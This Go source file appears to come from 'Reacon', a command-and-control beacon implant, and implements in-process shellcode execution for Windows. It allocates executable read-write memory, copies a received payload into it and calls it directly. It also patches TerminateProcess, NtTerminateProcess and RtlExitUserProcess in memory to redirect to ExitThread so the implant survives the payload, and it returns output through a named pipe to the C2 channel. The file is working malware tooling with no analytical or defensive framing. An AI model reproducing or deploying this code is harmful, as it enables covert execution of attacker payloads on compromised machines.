package commands

import (
	"Reacon/pkg/communication"
	"encoding/binary"
	"fmt"
	"github.com/google/uuid"
	"golang.org/x/sys/windows"
	"log"
	"syscall"
	"time"
	"unsafe"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PROCESS_ALL_ACCESS     = 0x001F0FFF
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	GENERIC_WRITE          = 0x40000000
	FILE_SHARE_WRITE       = 0x00000002
	CREATE_ALWAYS          = 2
	FILE_ATTRIBUTE_NORMAL  = 0x80
	STD_OUTPUT_HANDLE      = -11
	MEM_RELEASE            = 0x8000
)

var (
	ntdll = windows.NewLazySystemDLL("ntdll.dll")

	virtualProtect      = kernel32.NewProc("VirtualProtect")
	writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	readProcessMemory   = kernel32.NewProc("ReadProcessMemory")
	openProcess         = kernel32.NewProc("OpenProcess")
	virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	getModuleHandleA    = kernel32.NewProc("GetModuleHandleA")
	getProcAddressProc  = kernel32.NewProc("GetProcAddress")
	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
	procCreateNamedPipe = kernel32.NewProc("CreateNamedPipeW")
	procReadFile        = kernel32.NewProc("ReadFile")
	procSetStdHandle    = kernel32.NewProc("SetStdHandle")
)

func getModuleHandleW(moduleName string) (uintptr, error) {
	moduleNameBytes := append([]byte(moduleName), 0)
	handle, _, err := getModuleHandleA.Call(uintptr(unsafe.Pointer(&moduleNameBytes[0])))
	if handle == 0 {
		return 0, fmt.Errorf("GetModuleHandle failed: %v", err)
	}
	return handle, nil
}

func getProcAddressW(moduleHandle uintptr, procName string) (uintptr, error) {
	procNameBytes := append([]byte(procName), 0)
	addr, _, err := getProcAddressProc.Call(moduleHandle, uintptr(unsafe.Pointer(&procNameBytes[0])))
	if addr == 0 {
		return 0, fmt.Errorf("GetProcAddress failed: %v", err)
	}
	return addr, nil
}

func patchExit(processHandle uintptr, debug bool) error {
	// 获取ExitThread函数地址
	kernelbaseHandle, err := getModuleHandleW("kernelbase.dll")
	if err != nil {
		return fmt.Errorf("failed to get kernelbase handle: %v", err)
	}
	exitThreadAddr, err := getProcAddressW(kernelbaseHandle, "ExitThread")
	if err != nil {
		return fmt.Errorf("failed to get ExitThread address: %v", err)
	}

	// 构造patch代码
	patchBytes := []byte{
		0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
		0x48, 0xB8, // mov rax,
	}
	// 添加ExitThread地址
	addrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrBytes, uint64(exitThreadAddr))
	patchBytes = append(patchBytes, addrBytes...)
	patchBytes = append(patchBytes, 0x50) // push rax
	patchBytes = append(patchBytes, 0xC3) // ret

	functionsToPath := []struct {
		module   string
		function string
	}{
		{"kernelbase.dll", "TerminateProcess"},
		{"ntdll.dll", "NtTerminateProcess"},
		{"ntdll.dll", "RtlExitUserProcess"},
	}

	// 对每个函数进行patch
	for _, f := range functionsToPath {
		moduleHandle, err := getModuleHandleW(f.module)
		if err != nil {
			debugLog(debug, "[!] Failed to get module handle for %s: %v", f.module, err)
			continue
		}

		funcAddr, err := getProcAddressW(moduleHandle, f.function)
		if err != nil {
			debugLog(debug, "[!] Failed to get proc address for %s: %v", f.function, err)
			continue
		}

		// 保存原始字节
		originalBytes := make([]byte, len(patchBytes))
		ret, _, err := readProcessMemory.Call(
			processHandle,
			funcAddr,
			uintptr(unsafe.Pointer(&originalBytes[0])),
			uintptr(len(originalBytes)),
			0,
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to read original bytes from %s: %v", f.function, err)
			continue
		}

		// 修改内存保护
		var oldProtect uint32
		ret, _, err = virtualProtect.Call(
			funcAddr,
			uintptr(len(patchBytes)),
			PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to change memory protection for %s: %v", f.function, err)
			continue
		}

		// 写入patch代码
		ret, _, err = writeProcessMemory.Call(
			processHandle,
			funcAddr,
			uintptr(unsafe.Pointer(&patchBytes[0])),
			uintptr(len(patchBytes)),
			0,
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to write patch bytes to %s: %v", f.function, err)
			continue
		}

		// 恢复内存保护
		ret, _, err = virtualProtect.Call(
			funcAddr,
			uintptr(len(patchBytes)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if ret == 0 {
			debugLog(debug, "[!] Warning: Failed to restore memory protection for %s: %v", f.function, err)
		}

		debugLog(debug, "[+] Successfully patched %s!%s", f.module, f.function)
	}

	return nil
}
func debugLog(debug bool, format string, v ...interface{}) {
	if debug {
		log.Printf(format, v...)
	}
}

// Define necessary Windows API functions

// SetStdHandle changes the standard output handle.
func SetStdHandle(nStdHandle int, hHandle windows.Handle) error {
	ret, _, err := syscall.Syscall(procSetStdHandle.Addr(), 2,
		uintptr(nStdHandle), uintptr(hHandle), 0)
	if ret == 0 {
		return fmt.Errorf("SetStdHandle failed: %v", err)
	}
	return nil
}

// CreateNamedPipe creates a named pipe on Windows.
func CreateNamedPipe(pipeName string) (windows.Handle, error) {
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeName)
	if err != nil {
		return 0, err
	}

	handle, err := windows.CreateNamedPipe(
		pipeNamePtr,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 65535, 65535, 0, nil)
	if err != nil {
		return 0, fmt.Errorf("Failed to create named pipe: %v", err)
	}
	return handle, nil
}

// ReadPipe reads data from the pipe.
func ReadPipe(pipe windows.Handle) ([]byte, error) {
	var bytesRead uint32
	buffer := make([]byte, 65535)
	ret, _, err := syscall.Syscall6(
		procReadFile.Addr(), 5,
		uintptr(pipe),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&bytesRead)),
		0, 0)
	if ret == 0 {
		return nil, fmt.Errorf("Failed to read pipe: %v", err)
	}
	return buffer[:bytesRead], nil
}

// VirtualAlloc allocates memory for shellcode execution
func VirtualAlloc(size int) (uintptr, error) {
	ret, _, err := syscall.Syscall6(
		procVirtualAlloc.Addr(), 4,
		0,             // NULL for no specific memory address
		uintptr(size), // The size of the memory to allocate
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE, // We want to execute the memory
		0, 0)
	if ret == 0 {
		return 0, fmt.Errorf("VirtualAlloc failed: %v", err)
	}
	return ret, nil
}

func generateRandomPipeName() string {
	// 使用 UUID 生成唯一的管道名
	return fmt.Sprintf(`\\.\\pipe\\EngineerPipe_%s`, uuid.New().String())
}

// VirtualProtect changes the memory protection of a block of memory
func VirtualProtect(ptr uintptr, size int, protect uint32) error {
	var oldProtect uint32
	ret, _, err := syscall.Syscall6(
		procVirtualProtect.Addr(), 4,
		ptr,
		uintptr(size),
		uintptr(protect),
		uintptr(unsafe.Pointer(&oldProtect)),
		0, 0)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	return nil
}

func Inline_Bin(buf []byte) {
	communication.DataProcess(0, []byte("[*] Executing..."))
	handle, _ := windows.GetCurrentProcess()
	if err := patchExit(uintptr(handle), true); err != nil {
		log.Printf("[!] Warning: Failed to patch exit functions: %v", err)
	}
	pipeName := generateRandomPipeName()
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeName)
	if err != nil {
		log.Fatalf("Failed to convert pipe name to UTF-16 pointer: %v", err)
		return
	}
	pipeHandle, err := windows.CreateNamedPipe(
		pipeNamePtr,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 65536, 65536, 0, nil)
	if err != nil {
		log.Fatalf("创建命名管道失败: %v", err)
		return
	}

	defer windows.Close(pipeHandle)

	// Open the pipe
	pipeHandle2, err := windows.CreateFile(
		pipeNamePtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		log.Fatalf("Failed to open named pipe: %v", err)
		return
	}
	defer windows.Close(pipeHandle2)

	// Set the output handle to the pipe
	SetStdHandle(STD_OUTPUT_HANDLE, pipeHandle2)

	// Start a goroutine to read data from the pipe
	go func() {
		for {
			output, err := ReadPipe(pipeHandle)
			if err != nil {
				log.Printf("Failed to read from pipe: %v", err)
				break
			}
			communication.DataProcess(0, output)
		}
	}()

	// Allocate memory for shellcode (ensure enough size)
	ptr, err := VirtualAlloc(len(buf))
	if err != nil {
		log.Fatalf("VirtualAlloc failed: %v", err)
		return
	}

	// Cast the allocated memory as a slice with enough length to hold buf
	shellcodeMemory := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), len(buf))

	// Copy shellcode into allocated memory
	copy(shellcodeMemory, buf)
	// Change memory protection to PAGE_EXECUTE_READWRITE
	err = VirtualProtect(ptr, len(buf), PAGE_EXECUTE_READWRITE)
	if err != nil {
		log.Fatalf("VirtualProtect failed: %v", err)
		return
	}

	// Execute shellcode using syscall.Syscall to avoid Go runtime interference
	_, _, callErr := syscall.Syscall(ptr, 0, 0, 0, 0)
	if callErr != 0 {
		log.Fatalf("Failed to execute shellcode: %v", callErr)
		return
	}

	// Wait for the reading goroutine to finish
	time.Sleep(5 * time.Second)
}
